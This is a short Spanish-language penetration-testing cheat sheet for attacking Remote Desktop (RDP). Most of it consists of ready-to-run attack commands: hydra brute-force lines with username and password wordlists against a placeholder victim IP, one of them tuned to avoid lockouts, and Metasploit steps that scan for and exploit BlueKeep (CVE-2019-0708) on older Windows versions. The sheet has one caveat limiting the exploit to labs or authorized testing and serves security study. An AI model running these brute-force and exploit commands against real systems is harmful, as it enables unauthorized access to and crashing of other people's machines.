Fuerza Bruta: hydra

# Simple
hydra -L <wordlists_usenames.txt> -p 'password123' <ip_victima> rdp

hydra  -L <wordlists_usenames.txt> -P <wordlists_password.txt> rdp://<ip_victima> -s <port>

# Complejo. Se recomienda usar -t para bajar la velocidad y evitar bloqueos
hydra -t 4 -V -f -L <wordlists_usenames.txt> -P <wordlists_password.txt> rdp://<ip_victima>

BlueKeep (CVE-2019-0708)

  • Versiones de Windows vulnerables: XP, Vista, Windows 7, Windows Server 2008 & R2
  • Metasploit tiene un módulo auxiliar para comprobar si es vulnerable, y otro para explotarlo

BlueKeep toca memoria del kernel y su explotación puede romper el sistema. Probarlo solo en laboratorio o con autorización explícita.

Comprobar si es vulnerable

use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOST <ip_target>
run

Explotación BlueKeep

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOST <ip_target>
run
